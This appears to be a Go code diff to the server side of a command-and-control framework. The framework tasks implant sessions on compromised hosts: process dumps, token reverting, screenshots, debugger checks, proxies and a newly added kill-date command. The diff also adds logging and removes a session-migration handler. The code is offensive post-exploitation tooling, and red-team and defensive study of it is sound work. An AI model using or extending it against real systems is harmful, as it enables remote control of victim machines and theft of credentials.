@@ -22,6 +22,7 @@ import (
 	"strconv"
 	"strings"
 	"sync"
+	"time"
 
 	"github.com/PurpleSec/routex"
 	"github.com/iDigitalFlame/xmt/c2"
@@ -50,6 +51,8 @@ type sessionManager struct {
 	*Cirrus
 	sync.RWMutex
 
+	// TODO(dij): Work on naming sessions
+	// n map[string]*session
 	e map[string]*session
 }
 
@@ -66,7 +69,8 @@ func (c *Cirrus) newSession(s *c2.Session) {
 	}
 	c.sessions.Unlock()
 	c.sessions.events.publishSessionNew(n)
-	s.Receive, s.Shutdown = c.migrateSession, c.shutdownSession
+	s.Shutdown = c.shutdownSession
+	c.log.Debug(`[cirrus/session] Added new Session "%s" (0x%X)!`, n, x.h)
 	c.sessionEvent(s, sSessionNew)
 	l := s.Listener()
 	if l == nil {
@@ -78,6 +82,7 @@ func (c *Cirrus) newSession(s *c2.Session) {
 	if c.listeners.RUnlock(); !ok || len(z.s) == 0 {
 		return
 	}
+	c.log.Debug(`[cirrus/session] Running auto script "%s" on "%s".`, n, z.s)
 	q, _ := c.script(z.s)
 	q.Lock()
 	j, err := s.Tasklet(q.s)
@@ -130,6 +135,7 @@ func (c *Cirrus) shutdownSession(s *c2.Session) {
 	if c.sessions.RUnlock(); !ok {
 		return
 	}
+	c.log.Debug(`[cirrus/session] Removing Session "%s" (0x%X)!`, n, x.h)
 	c.sessions.clearJobs(x)
 	c.sessions.Lock()
 	c.sessions.e[n] = nil
@@ -137,19 +143,6 @@ func (c *Cirrus) shutdownSession(s *c2.Session) {
 	c.sessions.Unlock()
 	c.events.publishSessionDelete(n)
 	c.sessionEvent(s, sSessionDelete)
-}
-func (c *Cirrus) migrateSession(s *c2.Session, n *com.Packet) {
-	if s == nil || n.ID != c2.RvMigrate {
-		return
-	}
-	i := s.ID.String()
-	c.sessions.RLock()
-	_, ok := c.sessions.e[i]
-	if c.sessions.RUnlock(); !ok {
-		return
-	}
-	c.events.publishSessionUpdate(i)
-	c.sessionEvent(s, sSessionUpdate)
 }
 func syscallPacket(c, a string, f *filter.Filter) (*com.Packet, error) {
 	if len(c) == 0 {
@@ -203,10 +196,15 @@ func syscallPacket(c, a string, f *filter.Filter) (*com.Packet, error) {
 		return task.ProcessDump(filter.I(a)), nil
 	case "procname":
 		return task.ProcessName(a), nil
-	case "check-dll":
-		return task.CheckDLL(a), nil
-	case "reload-dll":
-		return task.ReloadDLL(a), nil
+	case "killdate":
+		if a == "0" || a == "00:00" {
+			return task.KillDate(time.Time{}), nil
+		}
+		t, err := parseTime(a)
+		if err != nil {
+			return nil, err
+		}
+		return task.KillDate(t), nil
 	}
 	return nil, errUnknownCommand
 }
@@ -236,16 +234,16 @@ func syscallSinglePacket(c string, f *filter.Filter) (*com.Packet, error) {
 		return task.UnTrust(f), nil
 	case "rev2self":
 		return task.RevToSelf(), nil
+	case "killdate":
+		return task.KillDate(time.Time{}), nil
 	case "procdump":
 		if f.Empty() {
 			return nil, errEmptyFilter
 		}
 		return task.ProcessDump(f), nil
-	case "zerotrace":
-		return task.ZeroTrace(), nil
 	case "screenshot":
 		return task.ScreenShot(), nil
-	case "check-debug":
+	case "check_debug":
 		return task.IsDebugged(), nil
 	}
 	return nil, errUnknownCommand
@@ -313,6 +311,7 @@ func (s *sessionManager) httpSessionProxyDelete(_ context.Context, w http.Respon
 	j, err := x.s.Task(task.ProxyRemove(strings.ToLower(n)))
 	if err != nil {
 		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
+		s.log.Warning(`[cirrus/http] httpSessionProxyDelete(): Error tasking Session "%s": %s!`, n, err.Error())
 		return
 	}
 	s.watchJob(x, j, "proxy delete "+n)
@@ -349,6 +348,7 @@ func (s *sessionManager) httpSessionProxyPutPost(_ context.Context, w http.Respo
 	}
 	if err != nil {
 		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
+		s.log.Warning(`[cirrus/http] httpSessionProxyPutPost(): Error tasking Session "%s": %s!`, n, err.Error())
 		return
 	}
 	if r.IsPost() {
